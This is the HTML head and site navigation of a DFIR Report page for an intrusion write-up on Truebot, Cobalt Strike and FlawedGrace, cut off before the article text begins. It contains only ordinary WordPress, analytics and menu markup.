<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>A Truly Graceful Wipe Out &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/18950" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=18950" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F06%2F12%2Fa-truly-graceful-wipe-out%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F06%2F12%2Fa-truly-graceful-wipe-out%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="cb6555b1c83ed510cf1c9cd7-text/javascript"></script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="cb6555b1c83ed510cf1c9cd7-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=501AB0AA968E24684684B652429F444E');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="A Truly Graceful Wipe Out" />
<meta property="og:url" content="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" />
<meta property="og:description" content="In this intrusion, dated May 2023, we observed Truebot being used to deploy Cobalt Strike and FlawedGrace (aka GraceWire &amp; BARBWIRE) resulting in the exfiltration of data and the deployment of …" />
<meta property="article:published_time" content="2023-06-12T01:06:26+00:00" />
<meta property="article:modified_time" content="2024-05-10T11:52:51+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/06/21619-003.png" />
<meta property="og:image:width" content="1161" />
<meta property="og:image:height" content="670" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="A Truly Graceful Wipe Out" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/06/21619-003.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-18950 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
